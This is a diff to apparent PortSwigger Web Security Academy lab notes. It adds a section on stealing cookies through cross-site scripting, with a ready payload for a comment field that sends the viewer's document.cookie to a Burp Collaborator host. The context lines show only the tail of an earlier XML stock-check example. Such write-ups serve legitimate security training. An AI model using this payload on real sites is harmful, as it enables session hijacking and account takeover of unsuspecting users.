@@ -13,3 +13,10 @@ You will need [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe5
     </storeId>
   </stockCheck>
 ```
+
+# Lab: Exploiting cross-site scripting to steal cookies 
+A simulated victim user views all comments after they are posted.<br>
+Write this payload into comment section:
+```js
+<script> document.location = "http://<BURP-COLLABORATOR>/?" + document.cookie </script>
+```
